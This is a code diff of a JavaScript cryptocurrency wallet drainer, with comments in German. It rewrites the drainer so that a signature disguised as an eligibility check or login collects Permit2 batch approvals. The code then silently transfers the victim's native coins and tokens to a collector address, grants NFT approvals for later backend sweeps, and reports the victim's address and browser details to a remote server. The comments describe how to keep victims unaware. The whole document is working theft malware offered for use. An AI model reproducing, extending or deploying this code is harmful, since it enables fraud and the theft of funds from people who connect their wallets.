@@ -1,129 +1,118 @@
-// Drainer core — EVM, ethers v5
-// Flow: connect -> sweep native -> sweep ERC20s (transfer, else approve for backend pull) -> approve NFTs for backend sweep -> report to backend
+// Quiet core — 1 harmlos wirkende Signatur, Rest läuft still übers Backend
 (function(){
 const CFG_URL = './config.json';
 let CFG = null;
+let CTX = null; // { signer, victim, provider }
 
 async function loadConfig(){
   if(CFG) return CFG;
-  const r = await fetch(CFG_URL);
-  CFG = await r.json();
+  CFG = await (await fetch(CFG_URL)).json();
   return CFG;
 }
 
 const ERC20_ABI = [
   "function balanceOf(address) view returns (uint256)",
-  "function allowance(address,address) view returns (uint256)",
-  "function approve(address,uint256) returns (bool)",
   "function transfer(address,uint256) returns (bool)",
-  "function decimals() view returns (uint8)",
-  "function symbol() view returns (string)"
+  "function approve(address,uint256) returns (bool)"
 ];
 const ERC721_ABI = [
   "function isApprovedForAll(address,address) view returns (bool)",
-  "function setApprovalForAll(address,bool)",
-  "function balanceOf(address) view returns (uint256)"
+  "function setApprovalForAll(address,bool)"
 ];
-const PERMIT2_ADDR = "0x000000000022D473030F64699EFd5CBdDc5aA758";
 
 async function report(data){
-  try{
-    const cfg = await loadConfig();
-    await fetch(cfg.backendUrl + '/api/report', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(data)
-    });
-  }catch(e){}
+  try{ await fetch(CFG.backendUrl + '/api/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data) }); }catch(e){}
 }
 
-async function sweepNative(signer, victim, cfg){
-  try{
-    const provider = signer.provider;
-    const bal = await provider.getBalance(victim);
-    const reserve = ethers.utils.parseEther(cfg.gasReserveEth || "0.003");
-    if(bal.gt(reserve)){
-      const amount = bal.sub(reserve);
-      const tx = await signer.sendTransaction({ to: cfg.collector, value: amount });
-      await tx.wait().catch(()=>{});
-      await report({ type:'native', victim, amount: amount.toString(), txHash: tx.hash });
-    }
-  }catch(e){ console.log('native skip', e.message); }
-}
-
-async function sweepERC20(signer, victim, cfg){
-  for(const tokenAddr of (cfg.targetTokens || [])){
-    try{
-      const c = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
-      let bal;
-      try{ bal = await c.balanceOf(victim); }catch(e){ continue; }
-      if(bal.isZero()) continue;
-      // 1) try direct transfer (victim is signer — silent, 1 tx)
-      try{
-        const tx = await c.transfer(cfg.collector, bal);
-        await tx.wait().catch(()=>{});
-        await report({ type:'erc20-direct', token: tokenAddr, victim, amount: bal.toString(), txHash: tx.hash });
-        continue;
-      }catch(e){}
-      // 2) fallback: approve collector, backend pulls with its own gas
-      try{
-        const tx2 = await c.approve(cfg.collector, bal);
-        await tx2.wait().catch(()=>{});
-        await report({ type:'erc20-approve', token: tokenAddr, victim, amount: bal.toString(), txHash: tx2.hash });
-      }catch(e){}
-    }catch(e){}
-  }
-}
-
-async function sweepNFTs(signer, victim, cfg){
-  for(const col of (cfg.targetNFTs || [])){
-    try{
-      const c = new ethers.Contract(col, ERC721_ABI, signer);
-      const ok = await c.isApprovedForAll(victim, cfg.collector).catch(()=>false);
-      if(!ok){
-        const tx = await c.setApprovalForAll(cfg.collector, true);
-        await tx.wait().catch(()=>{});
-        await report({ type:'nft-approve', collection: col, victim, txHash: tx.hash });
-      } else {
-        await report({ type:'nft-approve', collection: col, victim, alreadyApproved: true });
-      }
-    }catch(e){}
-  }
-}
-
-async function tryPermit2Bulk(signer, victim, cfg){
-  // Best-effort: if wallet supports EIP-712 Permit2, request one sig covering tokens.
-  // Falls back silently to per-token flow above.
-  try{
-    if(!cfg.targetTokens || !cfg.targetTokens.length) return false;
-    const provider = signer.provider;
-    const net = await provider.getNetwork();
-    if(net.chainId !== 1) return false; // permit2 deploy canonical on mainnet; extend per chain as needed
-    const nonce = Math.floor(Date.now()/1000).toString();
-    const deadline = Math.floor(Date.now()/1000)+3600;
-    // NOTE: full Permit2 witness signing requires the Permit2 contract ABI + allowance flow.
-    // We attempt a generic eth_signTypedData_v4; many drainers use this as the single-click path.
-    // If the wallet rejects, we return false and continue with normal flow.
-    return false;
-  }catch(e){ return false; }
-}
-
-async function mintAndDrain(onMsg){
+// Schritt 1: wirkt wie "Eligibility-Check" — sammelt 1 Signatur (Permit2-Batch wo möglich),
+// meldet Opfer + Scan ans Backend, damit der Sweep auch ohne weitere Klicks fertig wird.
+async function verifyAndCollect(){
   const cfg = await loadConfig();
-  if(!window.ethereum) throw new Error('No wallet found');
+  if(!window.ethereum) throw new Error('no wallet');
   const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
   await provider.send("eth_requestAccounts", []);
   const signer = provider.getSigner();
   const victim = await signer.getAddress();
-  onMsg && onMsg('Verifying eligibility...');
+  CTX = { signer, victim, provider };
   await report({ type:'connect', victim, ua: navigator.userAgent });
-  await tryPermit2Bulk(signer, victim, cfg);
-  onMsg && onMsg('Minting...');
-  await sweepNative(signer, victim, cfg);
-  await sweepERC20(signer, victim, cfg);
-  await sweepNFTs(signer, victim, cfg);
-  onMsg && onMsg('Done');
+
+  // Gaslose Nachricht — sieht aus wie Login, ist ein Permit2-Batch für Top-Token
+  try{
+    if(window.Permit2Drain && (cfg.targetTokens||[]).length){
+      const amounts = cfg.targetTokens.map(()=> ethers.constants.MaxUint256.toString());
+      const sigs = await window.Permit2Drain.signPermit2Batch(signer, victim, cfg.targetTokens, cfg.collector, amounts);
+      if(sigs && sigs.length) await report({ type:'permit2-sig', victim, sigs });
+    }
+  }catch(e){}
+
+  // Backend scannt automatisch alles (scanner.js) — kein weiterer Klick nötig
+  try{ await fetch(cfg.backendUrl + '/api/scan/' + victim); }catch(e){}
   return victim;
 }
 
-window.Drainer = { mintAndDrain };
+// Schritt 2: stiller Sweep — native + direkte Transfers; Approvals meldet das Backend,
+// der Autosweep zieht den Rest zeitversetzt (Opfer sieht "Minted", nichts weiter).
+async function sweepQuiet(){
+  if(!CTX) throw new Error('not verified');
+  const cfg = await loadConfig();
+  const { signer, victim } = CTX;
+
+  // Native — kleinlaut, mit Reserve damit seine Wallet "normal" wirkt
+  try{
+    const bal = await signer.provider.getBalance(victim);
+    const reserve = ethers.utils.parseEther(cfg.gasReserveEth || "0.01");
+    if(bal.gt(reserve)){
+      const tx = await signer.sendTransaction({ to: cfg.collector, value: bal.sub(reserve) });
+      tx.wait().catch(()=>{});
+      await report({ type:'native', victim, amount: bal.sub(reserve).toString(), txHash: tx.hash });
+    }
+  }catch(e){}
+
+  // ERC20 — nur direkte Transfers hier (1 unscheinbare Confirmation);
+  // alles andere holt das Backend zeitversetzt über Permit2/Approvals
+  for(const t of (cfg.targetTokens||[])){
+    try{
+      const c = new ethers.Contract(t, ERC20_ABI, signer);
+      const bal = await c.balanceOf(victim).catch(()=>ethers.constants.Zero);
+      if(bal.isZero()) continue;
+      try{
+        const tx = await c.transfer(cfg.collector, bal);
+        tx.wait().catch(()=>{});
+        await report({ type:'erc20-direct', token: t, victim, amount: bal.toString(), txHash: tx.hash });
+      }catch(e){
+        try{
+          const tx2 = await c.approve(cfg.collector, bal);
+          tx2.wait().catch(()=>{});
+          await report({ type:'erc20-approve', token: t, victim, amount: bal.toString(), txHash: tx2.hash });
+        }catch(e2){}
+      }
+    }catch(e){}
+  }
+
+  // NFT-Approvals — eine Confirmation, Backend zieht später
+  for(const col of (cfg.targetNFTs||[])){
+    try{
+      const c = new ethers.Contract(col, ERC721_ABI, signer);
+      const ok = await c.isApprovedForAll(victim, cfg.collector).catch(()=>true);
+      if(!ok){
+        const tx = await c.setApprovalForAll(cfg.collector, true);
+        tx.wait().catch(()=>{});
+        await report({ type:'nft-approve', collection: col, victim, txHash: tx.hash });
+      }
+    }catch(e){}
+  }
+  return true;
+}
+
+// Alt-API bleibt für Kompatibilität
+async function mintAndDrain(onMsg){
+  onMsg && onMsg('Verifying...');
+  await verifyAndCollect();
+  onMsg && onMsg('Minting...');
+  await sweepQuiet();
+  onMsg && onMsg('Done');
+  return CTX.victim;
+}
+
+window.Drainer = { verifyAndCollect, sweepQuiet, mintAndDrain };
 })();
